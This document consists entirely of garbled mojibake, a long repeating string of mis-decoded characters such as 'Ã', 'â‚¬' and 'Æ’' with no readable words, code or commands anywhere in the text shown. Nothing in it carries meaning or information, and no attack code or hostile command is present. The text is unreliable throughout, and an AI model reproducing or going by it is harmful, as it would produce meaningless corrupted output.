Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€šÃ‚Â¦ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã‚Â¦ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¾ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬Ãƒâ€¦Ã‚Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¾ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬ ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ÃƒÂ¢Ã¢â‚¬Å¾Ã‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â‚¬Å¡Ã‚Â¬ ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¾Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬ ÃƒÂ¢Ã¢â€šÂ¬Ã¢â€žÂ¢ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€ Ã¢â‚¬â„¢ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã†â€™Ãƒâ€šÃ‚Â¢ÃƒÆ’Ã‚Â¢ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã¢â‚¬Â¦Ãƒâ€šÃ‚Â¡ÃƒÆ’Ã†â€™ÃƒÂ¢Ã¢â€šÂ¬Ã…Â¡ÃƒÆ’Ã¢â‚¬Å¡Ãƒâ€šÃ‚Â¬ÃƒÆ’Ã†â€™Ãƒâ€ 